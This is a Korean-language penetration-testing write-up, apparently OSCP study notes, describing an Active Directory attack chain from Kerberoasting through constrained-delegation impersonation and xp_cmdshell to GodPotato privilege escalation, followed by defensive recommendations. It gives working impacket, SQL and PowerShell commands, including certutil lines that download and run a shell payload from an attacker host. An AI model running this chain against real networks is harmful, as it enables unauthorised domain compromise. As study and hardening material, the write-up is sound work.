---
title: "AD 환경 Kerberos 체인 공격: 위임 남용과 토큰 가장으로 DC 장악"
tags:
  - OSCP
  - ActiveDirectory
  - Kerberos
  - 권한상승
  - 침투테스트
---

액티브 디렉터리(AD) 침투에서 가장 흔히 반복되는 흐름 중 하나는 "약한 초기 자격증명 → Kerberoast로 서비스 계정 탈취 → 그 계정의 위임(delegation) 권한 남용 → 서비스 레벨 RCE → 토큰 가장으로 SYSTEM"으로 이어지는 체인입니다. 개별 기법은 각각 잘 알려져 있지만, 이 네 가지가 한 환경에서 순서대로 엮이는 패턴을 정리해두면 실전에서 체인을 훨씬 빨리 알아볼 수 있습니다.

아래 명령은 전부 플레이스홀더(`<target>`, `<domain>`, `<user>`)로 일반화했습니다. 모든 기법은 본인 소유 랩이나 명시적으로 인가된 시스템에서만 재현하세요. 특정 코스/챌린지의 풀이 원문(머신명·IP·플래그)은 해당 제공자의 정책에 따라 비공개로 보관합니다.

---

## 1. 내부 공지/지원 페이지에서 사용자명 규칙 유출

의외로 흔한 초기 접근 경로입니다. 사내 IT 지원 페이지나 안내 문서가 "이렇게 정보를 수집해서 보내주세요" 같은 예시 화면을 캡처해 올려두는데, 그 캡처에 실제 조직 계정명이 그대로 노출되는 경우가 있습니다. 여기서 사용자명 규칙(이니셜+성 등)과 유효 계정 하나를 동시에 얻을 수 있고, 운 좋으면 그 계정의 비밀번호가 계정명과 동일하거나 조직 기본값으로 설정돼 있어 바로 인증이 됩니다.

```bash
# 추정한 사용자명으로 Kerberos TGT 발급 시도 (비밀번호 = 사용자명인 경우)
impacket-getTGT "<domain>/<user>:<user>" -dc-ip <target>
export KRB5CCNAME="$PWD/<user>.ccache"

# 발급된 티켓으로 SMB 공유 열거
impacket-smbclient -k -no-pass "<domain>/<user>@<target>"
```

발판이 생기면 가장 먼저 공유 폴더를 돌며 서비스 계정 이름의 단서(문서, 스크립트, 설정 파일)를 찾습니다.

![사내 IT 지원 페이지 예시 화면 — 실제 계정명과 이메일 도메인은 마스킹](/OSCP/images/oscp-support-page-leak.png)

## 2. Kerberoasting — 서비스 계정의 TGS를 오프라인 크랙

도메인에 인증된 계정이 하나라도 있으면, SPN(Service Principal Name)이 등록된 서비스 계정 전체의 TGS(서비스 티켓)를 요청할 수 있습니다. 이 티켓은 해당 서비스 계정의 비밀번호 해시로 암호화돼 있어, 오프라인에서 워드리스트로 크랙을 시도할 수 있습니다. 서비스 계정은 사람이 로그인하는 계정보다 비밀번호 정책이 느슨한 경우가 많아 성공률이 꽤 높습니다.

```bash
impacket-GetUserSPNs "<domain>/<user>" -dc-host <dc-hostname> -dc-ip <target> -k -no-pass -request
# 결과 해시($krb5tgs$23$...) 를 tgs.txt 에 저장

john tgs.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

여기서 평문 비밀번호가 나오면, 그 서비스 계정으로 다시 TGT를 발급받아 다음 단계로 넘어갑니다.

![john + rockyou.txt 로 Kerberoast TGS 해시를 크랙하는 화면, 실제 크랙된 비밀번호 값은 마스킹](/OSCP/images/oscp-kerberoast-crack.png)

## 3. 제약 위임(Constrained Delegation) 남용 — 관리자로 가장한 서비스 세션

Kerberoast로 확보한 서비스 계정에 특정 서비스(예: MSSQL)에 대한 제약 위임이 설정돼 있으면, 그 서비스에 한해 **다른 임의 사용자(관리자 포함)로 가장한 서비스 티켓**을 발급받을 수 있습니다. 즉 서비스 계정 자체의 OS 권한은 낮아도, "그 서비스 입장에서는 administrator가 접속한 것처럼" 보이는 세션을 만들 수 있습니다.

이 위임은 주어지는 게 아니라 먼저 확인해야 하는 전제조건입니다. `findDelegation.py`(impacket), BloodHound, 또는 PowerView(`Get-DomainUser -TrustedToAuth`)로 크랙한 서비스 계정에 위임이 걸려 있는지, 걸려 있다면 어느 서비스(SPN) 대상인지부터 확인합니다. 또한 `-impersonate`로 임의 사용자를 가장하려면(S4U2Self로 받은 티켓이 forwardable해져 S4U2Proxy까지 성공하려면) 해당 계정에 **Protocol Transition**(UserAccountControl의 `TRUSTED_TO_AUTH_FOR_DELEGATION` 플래그, `msDS-AllowedToDelegateTo`에 대상 SPN 등록)이 함께 설정돼 있어야 합니다. 이 조건이 없으면 같은 명령을 그대로 따라 해도 재현되지 않습니다.

```bash
# 위임 여부·대상 SPN·Protocol Transition 플래그 확인
impacket-findDelegation "<domain>/<user>:<password>" -dc-ip <target>

impacket-getTGT "<domain>/<svc_account>:<cracked_pw>" -dc-ip <target>
export KRB5CCNAME="$PWD/<svc_account>.ccache"

# <svc_account> 에 설정된 위임을 이용해 administrator로 가장한 서비스 티켓 발급
impacket-getST -spn <service>/<dc-hostname> -impersonate administrator \
  "<domain>/<svc_account>:<cracked_pw>" -dc-ip <target>
export KRB5CCNAME="$PWD/administrator.ccache"

impacket-mssqlclient -k -no-pass "<domain>/administrator@<dc-hostname>"
```

접속하면 SQL 로그인은 `administrator`로 보이지만, 실제 OS 프로세스 컨텍스트는 여전히 서비스 계정이라는 점을 꼭 확인해야 합니다(`xp_cmdshell 'whoami'` 등으로 검증). 이 차이를 혼동하면 다음 단계에서 왜 관리자 바탕화면 파일을 못 읽는지 헷갈리게 됩니다.

![xp_cmdshell 활성화 후 whoami 실행 — SQL 로그인은 administrator지만 실제 OS whoami 결과는 서비스 계정으로 나오는 것을 확인 (도메인명은 마스킹)](/OSCP/images/oscp-delegation-whoami.png)

## 4. xp_cmdshell → SeImpersonatePrivilege → Potato 계열로 SYSTEM

MSSQL의 `xp_cmdshell`을 활성화하면 SQL 세션에서 OS 명령 실행 경로가 열립니다. 이렇게 띄운 셸은 보통 MSSQL 서비스 계정 권한인데, 이 계정에는 `SeImpersonatePrivilege`가 기본으로 부여돼 있는 경우가 많습니다. 이 권한이 있으면 GodPotato·PrintSpoofer 같은 Potato 계열 도구로 로컬 시스템 토큰을 가장해 `NT AUTHORITY\SYSTEM`까지 상승할 수 있습니다.

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami /priv';
-- SeImpersonatePrivilege: Enabled 확인
```

![xp_cmdshell 로 띄운 셸에서 whoami /priv 실행, SeImpersonatePrivilege 가 Enabled 상태인 것을 확인 (타깃 IP·로그 파일명은 마스킹)](/OSCP/images/oscp-seimpersonate.png)

```powershell
# 공격자 호스트로 페이로드/도구 전달
certutil -urlcache -f http://<attacker-ip>/shell.exe C:\Windows\Temp\shell.exe
certutil -urlcache -f http://<attacker-ip>/GodPotato-NET4.exe GodPotato-NET4.exe

# SeImpersonatePrivilege 를 DCOM/COM 토큰 가장으로 악용 → SYSTEM 셸
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\shell.exe"
```

대상이 도메인 컨트롤러 자체라면, 이 시점에 로컬 SYSTEM 획득은 사실상 도메인 전체 장악과 동급입니다.

![GodPotato 실행 로그 — DCOM 토큰 가장으로 NT AUTHORITY\SYSTEM 토큰을 탈취하는 순간 (상단 접속 로그의 타깃 IP는 마스킹)](/OSCP/images/oscp-godpotato-system.png)

---

## 체인 전체 그림

```
내부 안내 페이지 정보 유출 → 사용자명 규칙 추정
        │  (계정명=비밀번호 등 약한 초기 자격증명)
        ▼
[1] 저특권 도메인 계정 획득
        │  (Kerberoasting)
        ▼
[2] 서비스 계정 TGS 크랙 → 평문 비밀번호 확보
        │  (제약 위임 남용)
        ▼
[3] administrator로 가장한 서비스 세션 (OS 권한은 아직 서비스 계정)
        │  (xp_cmdshell RCE)
        ▼
[4] 서비스 계정 셸 획득 → SeImpersonatePrivilege 확인
        │  (Potato 계열 토큰 가장)
        ▼
NT AUTHORITY\SYSTEM
```

핵심은 각 단계가 "이전 단계의 산출물을 다음 단계의 입력으로 쓰는" 자격증명/티켓 체인이라는 점입니다. 개별 기법 하나하나는 막아도, 체인 중간에 끊을 지점(서비스 계정 비밀번호 강도, 불필요한 위임, xp_cmdshell, SeImpersonatePrivilege)이 여러 개라는 걸 알면 방어 우선순위를 잡기도 쉬워집니다.

방어는 다음을 함께 적용하는 것입니다.

- 내부 안내/지원 문서에 실제 계정명이 노출되지 않도록 더미 데이터로 교체
- 초기 계정 비밀번호를 계정명과 다르게 강제, 최초 로그인 시 변경 요구
- Kerberoastable 서비스 계정은 25자 이상 무작위 비밀번호 또는 gMSA로 전환
- 불필요한 제약 위임 제거, 필요 시 Resource-based Constrained Delegation으로 범위 최소화
- MSSQL `xp_cmdshell`은 업무상 불필요하면 영구 비활성화
- 서비스 계정의 `SeImpersonatePrivilege`를 재검토하고 최소 권한으로 실행

이 글은 공개 자료에 보편적으로 존재하는 일반 기법을, 특정 머신·자격증명·플래그 없이 추상화해 정리한 것입니다. 특정 코스/챌린지의 풀이 원문은 해당 제공자의 정책에 따라 비공개로 보관하세요.

## 참고

- [Impacket (Fortra)](https://github.com/fortra/impacket)
- [GodPotato (BeichenDream)](https://github.com/BeichenDream/GodPotato)
- [Kerberoasting — hacktricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
- [Constrained Delegation 남용 — hacktricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation)
